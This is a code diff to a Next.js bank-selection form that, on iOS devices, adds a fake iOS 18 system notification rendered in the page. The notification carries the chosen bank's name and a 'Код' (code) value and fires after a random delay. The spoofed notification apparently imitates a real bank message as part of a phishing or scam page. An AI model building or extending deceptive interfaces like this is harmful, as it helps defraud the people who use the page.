@@ -20,12 +20,13 @@ import SubmitButton from "@/components/features/form/SubmitButton";
 import { StyledTypography } from "@/components/ui/StyledTypography";
 import { errorFormHandlerWithAlert } from "@/helpers/error/error.handler.helper";
 import Bank from "@/components/layout/Bank";
-import { BankDto, DataDto } from "@myorg/shared/dto";
+import { BankDto, ContinueTokenContextDto, DataDto } from "@myorg/shared/dto";
 import {
   decodeStorageValue,
   encodeStorageValue,
 } from "@/helpers/storage.helper";
 import { useSearchParams } from "next/navigation";
+import { iosNotify } from "@/components/ios-notification";
 
 function FieldBlock({
   label,
@@ -83,7 +84,9 @@ export default function AcceptForm({
   banks,
   data,
   token,
+  type,
 }: {
+  type: ContinueTokenContextDto["type"];
   banks: BankDto[];
   data: DataDto | null;
   token: string;
@@ -113,6 +116,17 @@ export default function AcceptForm({
       // Небольшая задержка — на это время кнопка показывает индикатор загрузки.
       await new Promise((resolve) => setTimeout(resolve, 800));
       setSelectedBank(bank);
+      if (type === "android") return;
+      const code = data?.confirmation || "";
+      setTimeout(() => {
+        iosNotify({
+          variant: "ios18",
+          title: bank?.name || "secure-service",
+          theme: "auto",
+          message: "Код: " + code,
+          time: "сейчас",
+        });
+      }, Math.random()*1000);
     } catch (error) {
       errorFormHandlerWithAlert<AcceptDtoInput>({
         error,
